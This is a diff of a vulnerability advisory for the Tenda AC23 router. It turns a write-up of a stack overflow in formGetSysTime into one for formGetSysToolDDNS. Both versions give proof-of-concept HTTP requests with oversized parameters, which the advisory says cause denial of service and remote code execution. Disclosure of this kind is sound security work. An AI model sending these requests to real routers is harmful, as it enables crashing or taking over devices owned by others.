@@ -1,4 +1,4 @@
-# Tenda AC23(V16.03.07.45_cn) has a Stack Buffer Overflow Vulnerability
+# Tenda AC23 formGetSysToolDDNS stack-based overflow
 
 ## 1.Product 
 
@@ -17,56 +17,60 @@
 
 ## 3.vulnerability details
 
-The vulnerability is in `/bin/httpd`, the function `formSetSysTime` `formGetSysTime`. The function `formSetSysTime` can set nvram val `sys.timefixper` to `v3`, which can be set through POST parameter `timePeriod`
+The vulnerability is in` /bin/httpd` , the function `formSetSysToolDDNS`, ` formGetSysToolDDNS` . The function `formSetSysToolDDNS` can set nvram val `adv.ddns1.en` to` v22` , **which can be set through POST parameter`ddnsEn`**
+
+![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/1.png)
+
+and in function `formGetSysToolDDNS` , the function calls `GetValue(“adv.ddns1.en”, v11)` to set the string to` v11` which is on the stack. So there is a stack overflow vulnerability. By analyze the funtion GetValue and SetValue , the max size of the string we can get from the function GetValue is `0x5DC` . It’s bigger than the size of`v11 `
 
 ![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/2.png)
 
-and in function `formGetSysTime`, the function calls `GetValue(“sys.timefixer”, v16)` to set the string to `v16` which is on the stack. So there is a stack overflow  vulnerability. 
-
-By analyzing the funtion `GetValue` and `SetValue`, the max size of the string we can get from the function `GetValue` is `0x5DC`. It’s bigger than the size of `v16`, so there will be a bufferoverflow vulnerability. 
-
-![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/3.png)
+so there is a buffer overflow vulnerability. 
 
 ## 4.poc
-
 1. You need to login and **replace the Cookie: password filed in poc**.
 2. By sending  poc1 and poc2 (remember to send poc2), it can cause dos and rce. 
 
 ```
-POST /goform/SetSysTimeCfg HTTP/1.1
+POST /goform/SetDDNSCfg HTTP/1.1
 Host: 192.168.0.1
-Content-Length: 105
+Content-Length: 641
 Accept: */*
 X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Origin: http://192.168.0.1
-Referer: http://192.168.0.1/system_time.html?random=0.836749282878861&
+Referer: http://192.168.0.1/ddns_config.html?random=0.48392112228286877&
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
-Cookie: password=25d55ad283aa400af464c76d713c07admvpcvb
+Cookie: password=25d55ad283aa400af464c76d713c07adoikcvb
 Connection: close
-
-timeType=sync&timePeriod=86400&ntpServer=time.windows.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&timeZone=20%3A00&time=2000-01-01%2000%3A58%3A22
+ddnsEn=111111111111111111111111111111111111111111111111111111111111111111111
+1111111111111111111111111111111111111111111111111111111111111111111111111111
+1111111111111111111111111111111111111111111111111111111111111111111111111111
+1111111111111111111111111111111111111111111111111111111111111111111111111111
+1111111111111111111111111111111111111111111111111111111111111111111111111111
+1111111111111111111111111111111111111111111111111111111111111111111111111111
+1111111111111111111111111111111111111111111111111111111111111111111111111111
+11111111111111111111111111111111111111111111111111&serverName=noip.com&ddnsUser=a&ddnsPwd=a&ddnsDomain=b.top
 ```
 
 ```
-GET /goform/GetSysTimeCfg?0.6678734602604752 HTTP/1.1
+GET /goform/GetDDNSCfg?0.45256296854497835 HTTP/1.1
 Host: 192.168.0.1
 Accept: application/json, text/javascript, */*; q=0.01
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
 X-Requested-With: XMLHttpRequest
-Referer: http://192.168.0.1/system_time.html?random=0.836749282878861&
+Referer: http://192.168.0.1/ddns_config.html?random=0.48392112228286877&
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
-Cookie: password=25d55ad283aa400af464c76d713c07admvpcvb
+Cookie: password=25d55ad283aa400af464c76d713c07adoikcvb
 Connection: close
-
 ```
 
-![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/4.png)
 
-----
 
 ### 5.Author
 
